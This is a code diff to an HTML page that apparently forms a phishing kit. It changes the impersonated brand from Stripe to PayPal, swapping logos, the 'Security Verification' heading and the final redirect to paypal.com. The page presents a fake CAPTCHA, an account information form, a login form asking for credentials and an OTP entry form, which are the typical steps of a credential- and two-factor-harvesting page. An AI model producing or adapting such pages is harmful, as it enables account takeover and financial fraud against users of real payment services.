@@ -16,59 +16,14 @@
         }
 
         /* General Styles */
-		body {
-			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-			margin: 0;
-			color: #333;
-			line-height: 1.6;
-			position: relative;
-			overflow: hidden;
-		}
-		
-		/* Animated Background */
-		.animated-background {
-			position: fixed;
-			top: 0;
-			left: 0;
-			width: 100%;
-			height: 100%;
-			z-index: -1;
-			background: linear-gradient(
-				225deg,
-				#FF69B4,    /* Pink */
-				#FF1493,    /* Deep Pink */
-				#FF4500,    /* Orange Red */
-				#FFA500,    /* Orange */
-				#9400D3,    /* Violet */
-				#4169E1,    /* Royal Blue */
-				#00CED1     /* Turquoise */
-			);
-			background-size: 300% 300%;
-			animation: gradientAnimation 20s ease infinite;
-		}
-
-		.background-overlay {
-			position: fixed;
-			bottom: 0;
-			left: 0;
-			right: 0;
-			height: 60%;
-			background: white;
-			border-radius: 50% 50% 0 0;
-			transform: scale(1.5);
-		}
-
-		@keyframes gradientAnimation {
-			0% {
-				background-position: 0% 50%;
-			}
-			50% {
-				background-position: 100% 50%;
-			}
-			100% {
-				background-position: 0% 50%;
-			}
-		}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+            line-height: 1.6;
+        }
 
         /* Main Container */
         .page-wrapper {
@@ -363,11 +318,9 @@
 
 <body>
     <!-- CAPTCHA Overlay -->
-	<div class="animated-background"></div>
-	<div class="background-overlay"></div>
     <div id="captchaContainer">
         <div class="captcha-box">
-            <h2>Stripe Security Verification</h2>
+            <h2>PayPal Security Verification</h2>
             <p>Please solve this simple math problem to continue</p>
             <div id="captcha-question" class="captcha-question"></div>
             <div class="input-group">
@@ -384,7 +337,7 @@
             <!-- User Information Form -->
             <div id="userInfoContainer" class="container">
                 <div class="header">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/800px-PayPal.svg.png" alt="Logo" class="logo">
                     <h2>Account Verification</h2>
                     <p class="subtitle">Please verify your information to continue</p>
                 </div>
@@ -439,7 +392,7 @@
             <!-- Login Form -->
             <div id="loginContainer" class="container" style="display: none;">
                 <div class="header">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/800px-PayPal.svg.png" alt="Logo" class="logo">
                     <h2>Account Login</h2>
                     <p class="subtitle">Please enter your credentials</p>
                 </div>
@@ -471,7 +424,7 @@
             <!-- OTP Verification Form -->
             <div id="otpContainer" class="container" style="display: none;">
                 <div class="header">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Logo" class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/800px-PayPal.svg.png" alt="Logo" class="logo">
                     <h2>OTP Verification</h2>
                     <p class="subtitle">Enter the code sent to your device</p>
                 </div>
@@ -629,7 +582,7 @@
                         document.getElementById(nextFormId).style.display = 'block';
                     } else {
                         // Final form submission
-                        window.location.href = 'https://stripe.com';
+                        window.location.href = 'https://paypal.com';
                     }
                 }, 1000);
             } catch (error) {
